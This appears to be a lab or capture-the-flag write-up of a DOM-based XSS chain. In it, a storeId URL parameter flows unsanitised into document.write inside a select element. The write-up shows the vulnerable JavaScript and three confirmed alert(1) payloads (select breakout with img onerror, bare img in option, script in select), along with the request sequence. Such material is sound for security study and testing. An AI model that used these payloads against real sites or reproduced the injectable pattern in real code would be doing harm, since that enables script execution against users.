# Attack Chain — DOM XSS via document.write inside select/option

## The vulnerable code (product page, served verbatim)
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) { continue; }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

## Data flow (common trunk)
```
Victim URL          /product?productId=1&storeId=PAYLOAD
   │
   ▼
[SOURCE] URLSearchParams.get('storeId')  (decoded once)
   │
   ▼
[SINK] document.write('<option selected>' + store + '</option>')  — parsed at the
insertion point, i.e. INSIDE the written <select>
   │
   ▼
[TRUST BOUNDARY CROSSED] parser interprets PAYLOAD as markup in select/option context
   ▼
RESULT: one of three executions (all CONFIRMED — see vectors)
```

## Vector A — select breakout + img (textbook)
PAYLOAD: `</select><img src=x onerror=alert(1)>`
Written fragment: `…<option selected=""></select><img src=x onerror=alert(1)>…`
Rendered DOM: `…<option selected=""></option></select><img src="x" onerror="…">…`
Mechanism: `</select>` pops the parser to body context; `<img>` becomes a normal
body-level element; bogus `src` errors → handler fires on load. Zero interaction.

## Vector B — bare img inside option (textbook says dead; actually fires)
PAYLOAD: `<img src=x onerror=alert(1)>` (no breakout at all)
Rendered DOM: `<select …><option selected=""><img src="x" onerror="…"></option>…`
Mechanism: the HTML parser ACCEPTS the foreign `<img>` as a child of `<option>`
(content-model violation tolerated) and its `onerror` fires. Proven in the lab page
(title SELIMG) AND in a static-HTML control (`data:text/html,…` → STATICIMG), so this
is general parser leniency, not a document.write quirk.

## Vector C — script inside select context (spec-skeptics, take note)
PAYLOAD: `<script>alert(1)</script>` (no breakout)
Mechanism: in-select `<script>` tokens are processed per in-head rules → the script
element is created and executes (title SELSCRIPT). The "scripts don't run in exotic
contexts" intuition is wrong here — it holds for `innerHTML` (spec neuter), NOT for
parser-inserted scripts in select context.

## Expected response sequence (verified)
1. `GET /product?productId=1&storeId=<single-encoded payload>` → 200, fixed page +
   inline sink script; `storeId` absent from raw bytes (pure DOM).
2. Browser runs sink; written markup parsed in select/option context.
3. Any of the three payload shapes executes on load (real-browser Vector A →
   `alert(1)` → `is-solved`).